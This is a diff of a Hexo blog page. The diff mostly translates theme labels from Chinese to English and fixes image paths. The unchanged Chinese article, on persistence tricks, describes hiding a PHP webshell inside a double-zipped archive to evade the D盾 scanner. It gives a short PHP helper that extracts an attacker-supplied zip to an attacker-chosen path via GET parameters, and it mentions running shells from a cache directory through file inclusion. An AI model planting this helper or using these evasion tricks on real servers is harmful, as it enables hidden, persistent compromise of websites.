@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang=zh>
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- so meta -->
     <meta charset="utf-8">
@@ -10,17 +10,17 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限维持小技巧">
 <meta property="og:url" content="http://yoursite.com/2018/08/05/权限维持小技巧/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="NAXG">
 <meta property="og:description" content="利用压缩文件来隐藏WEBSHELL分享几个用来隐藏WEBSHELL的小技巧。把一句话木马压缩成a.zip文件使用D盾扫一下重新对a.zip再进行压缩，压缩成11.zip这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。而已D盾还不会对PHP压缩包类进行报毒等操作。 1234567891011121314151617&amp;lt;?php">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2018/08/05/权限维持小技巧/%5Cimages%5Cpasted-10.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/05/权限维持小技巧/%5Cimages%5Cpasted-11.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/05/权限维持小技巧/%5Cimages%5Cpasted-12.png">
-<meta property="og:updated_time" content="2018-08-05T14:57:32.443Z">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/pasted-10.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-11.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-12.png">
+<meta property="og:updated_time" content="2019-07-09T13:43:42.836Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="权限维持小技巧">
 <meta name="twitter:description" content="利用压缩文件来隐藏WEBSHELL分享几个用来隐藏WEBSHELL的小技巧。把一句话木马压缩成a.zip文件使用D盾扫一下重新对a.zip再进行压缩，压缩成11.zip这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。而已D盾还不会对PHP压缩包类进行报毒等操作。 1234567891011121314151617&amp;lt;?php">
-<meta name="twitter:image" content="http://yoursite.com/2018/08/05/权限维持小技巧/%5Cimages%5Cpasted-10.png">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-10.png">
     
     
         
@@ -62,13 +62,13 @@
     <span id="nav">
       <ul>
          
-          <li><a href="/">首页</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/about/">关于</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/naxg">项目</a></li>
+          <li><a href="http://github.com/naxg">Projects</a></li>
         
       </ul>
     </span>
@@ -76,16 +76,18 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" href="/2019/07/09/恢复更新/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" href="/2018/08/04/金融行业网络安全比赛WP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
     </span>
     <br/>
     <div id="share" style="display: none">
@@ -143,7 +145,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="利用压缩文件来隐藏WEBSHELL"><a href="#利用压缩文件来隐藏WEBSHELL" class="headerlink" title="利用压缩文件来隐藏WEBSHELL"></a>利用压缩文件来隐藏WEBSHELL</h1><p>分享几个用来隐藏WEBSHELL的小技巧。<br>把一句话木马压缩成a.zip文件<br><img src="%5Cimages%5Cpasted-10.png" alt="upload successful"><br>使用D盾扫一下<br><img src="%5Cimages%5Cpasted-11.png" alt="upload successful"><br>重新对a.zip再进行压缩，压缩成11.zip<br><img src="%5Cimages%5Cpasted-12.png" alt="upload successful"><br>这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。<br>而已D盾还不会对PHP压缩包类进行报毒等操作。</p>
+    <h1 id="利用压缩文件来隐藏WEBSHELL"><a href="#利用压缩文件来隐藏WEBSHELL" class="headerlink" title="利用压缩文件来隐藏WEBSHELL"></a>利用压缩文件来隐藏WEBSHELL</h1><p>分享几个用来隐藏WEBSHELL的小技巧。<br>把一句话木马压缩成a.zip文件<br><img src="/images/pasted-10.png" alt><br>使用D盾扫一下<br><img src="/images/pasted-11.png" alt><br>重新对a.zip再进行压缩，压缩成11.zip<br><img src="/images/pasted-12.png" alt><br>这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。<br>而已D盾还不会对PHP压缩包类进行报毒等操作。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	if(isset($_GET[&apos;zip&apos;]))&#123;</span><br><span class="line">		if(isset($_GET[&apos;f&apos;]))&#123;</span><br><span class="line">			$zipname=$_GET[&apos;zip&apos;];</span><br><span class="line">			$f=$_GET[&apos;f&apos;];</span><br><span class="line">			$zip = new ZipArchive; </span><br><span class="line">			$res = $zip-&gt;open(&quot;$zipname&quot;); </span><br><span class="line">			if ($res === TRUE) &#123; </span><br><span class="line">				$zip-&gt;extractTo(&quot;$f&quot;);</span><br><span class="line">				echo &apos;解压成功&apos;;</span><br><span class="line">			&#125; else &#123; </span><br><span class="line">				echo &apos;failed, code:&apos; . $res; </span><br><span class="line">			 &#125; </span><br><span class="line">			 $zip-&gt;close(); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>只需解压两次即可把shell解压出来。</p>
 <h1 id="利用缓存目录来隐藏shell"><a href="#利用缓存目录来隐藏shell" class="headerlink" title="利用缓存目录来隐藏shell"></a>利用缓存目录来隐藏shell</h1><p>文件上传到缓存目录，在把文件移动到web目录前，利用文件包含来执行代码。</p>
@@ -160,13 +162,13 @@
     <div id="nav-footer" style="display: none">
       <ul>
          
-          <li><a href="/">首页</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/about/">关于</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/naxg">项目</a></li>
+          <li><a href="http://github.com/naxg">Projects</a></li>
         
       </ul>
     </div>
@@ -192,10 +194,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
   </div>
@@ -204,19 +206,19 @@
         
         <footer id="footer">
   <div class="footer-left">
-    Copyright &copy; 2019 John Doe
+    Copyright &copy; 2019 NAXG
   </div>
   <div class="footer-right">
     <nav>
       <ul>
          
-          <li><a href="/">首页</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/about/">关于</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/archives/">归档</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/naxg">项目</a></li>
+          <li><a href="http://github.com/naxg">Projects</a></li>
         
       </ul>
     </nav>
